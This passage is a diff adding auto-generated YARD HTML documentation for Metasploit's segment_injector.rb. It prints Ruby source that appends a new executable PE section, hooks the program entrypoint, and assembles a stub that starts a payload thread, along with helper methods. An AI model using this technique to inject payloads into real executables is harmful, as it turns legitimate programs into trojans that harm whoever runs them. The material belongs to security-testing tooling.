+  <span class='id identifier rubyid_s'>s</span><span class='period'>.</span><span class='id identifier rubyid_name'>name</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>.text</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_s'>s</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span> <span class='op'>=</span> <span class='id identifier rubyid_payload_stub'>payload_stub</span><span class='lparen'>(</span><span class='id identifier rubyid_prefix'>prefix</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_s'>s</span><span class='period'>.</span><span class='id identifier rubyid_characteristics'>characteristics</span> <span class='op'>=</span> <span class='qwords_beg'>%w[</span><span class='tstring_content'>MEM_READ</span><span class='words_sep'> </span><span class='tstring_content'>MEM_WRITE</span><span class='words_sep'> </span><span class='tstring_content'>MEM_EXECUTE</span><span class='tstring_end'>]</span></span>
+
+  <span class='comment'># Tell our section where the original entrypoint was
+</span>  <span class='kw'>if</span> <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_optheader'>optheader</span><span class='period'>.</span><span class='id identifier rubyid_entrypoint'>entrypoint</span> <span class='op'>!=</span> <span class='int'>0</span>
+    <span class='id identifier rubyid_s'>s</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span><span class='period'>.</span><span class='id identifier rubyid_fixup!'>fixup!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>entrypoint</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_optheader'>optheader</span><span class='period'>.</span><span class='id identifier rubyid_image_base'>image_base</span> <span class='op'>+</span> <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_optheader'>optheader</span><span class='period'>.</span><span class='id identifier rubyid_entrypoint'>entrypoint</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_sections'>sections</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_s'>s</span>
+  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_invalidate_header'>invalidate_header</span>
+
+  <span class='comment'># Change the entrypoint to our new section
+</span>  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_optheader'>optheader</span><span class='period'>.</span><span class='id identifier rubyid_entrypoint'>entrypoint</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>hook_entrypoint</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_cpu'>cpu</span> <span class='op'>=</span> <span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='period'>.</span><span class='id identifier rubyid_cpu'>cpu</span>
+
+  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="is_warbird?-instance_method">
+  
+    #<strong>is_warbird?</strong>(pe)  &#x21d2; <tt>Boolean</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Boolean</tt>)</span>
+      
+      
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 133</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_is_warbird?'>is_warbird?</span><span class='lparen'>(</span><span class='id identifier rubyid_pe'>pe</span><span class='rparen'>)</span>
+  <span class='comment'># The byte sequence is for the following code pattern:
+</span>  <span class='comment'># .text:004136B4                 mov     eax, large fs:30h
+</span>  <span class='comment'># .text:004136BA                 sub     ecx, edx
+</span>  <span class='comment'># .text:004136BC                 sar     ecx, 1
+</span>  <span class='comment'># .text:004136BE                 mov     eax, [eax+0Ch]
+</span>  <span class='comment'># .text:004136C1                 add     eax, 0Ch
+</span>  <span class='id identifier rubyid_pattern'>pattern</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x64\xA1\x30\x00\x00\x00\x2B\xCA\xD1\xF9\x8B\x40\x0C\x83\xC0\x0C</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_section'>section</span> <span class='op'>=</span> <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_sections'>sections</span><span class='period'>.</span><span class='id identifier rubyid_find'>find</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_s'>s</span><span class='op'>|</span> <span class='id identifier rubyid_s'>s</span><span class='period'>.</span><span class='id identifier rubyid_name'>name</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>.text</span><span class='tstring_end'>&#39;</span></span> <span class='rbrace'>}</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_section'>section</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+    <span class='kw'>return</span> <span class='kw'>false</span>
+  <span class='kw'>elsif</span> <span class='id identifier rubyid_section'>section</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_section'>section</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span><span class='period'>.</span><span class='id identifier rubyid_pattern_scan'>pattern_scan</span><span class='lparen'>(</span><span class='id identifier rubyid_pattern'>pattern</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_blank?'>blank?</span>
+    <span class='kw'>return</span> <span class='kw'>false</span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>true</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="payload_stub-instance_method">
+  
+    #<strong>payload_stub</strong>(prefix)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+124
+125
+126
+127
+128
+129
+130
+131</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 124</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_payload_stub'>payload_stub</span><span class='lparen'>(</span><span class='id identifier rubyid_prefix'>prefix</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>hook_entrypoint:\n</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_prefix'>prefix</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_create_thread_stub'>create_thread_stub</span>
+
+  <span class='id identifier rubyid_shellcode'>shellcode</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='id identifier rubyid_processor'>processor</span><span class='comma'>,</span> <span class='id identifier rubyid_asm'>asm</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_shellcode'>shellcode</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span> <span class='op'>+</span> <span class='ivar'>@payload</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="processor-instance_method">
+  
+    #<strong>processor</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 37</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_processor'>processor</span>
+  <span class='kw'>case</span> <span class='ivar'>@arch</span>
+  <span class='kw'>when</span> <span class='symbol'>:x86</span>
+    <span class='kw'>return</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Ia32</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
+  <span class='kw'>when</span> <span class='symbol'>:x64</span>
+    <span class='kw'>return</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X86_64</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Incompatible architecture</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:33:04 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
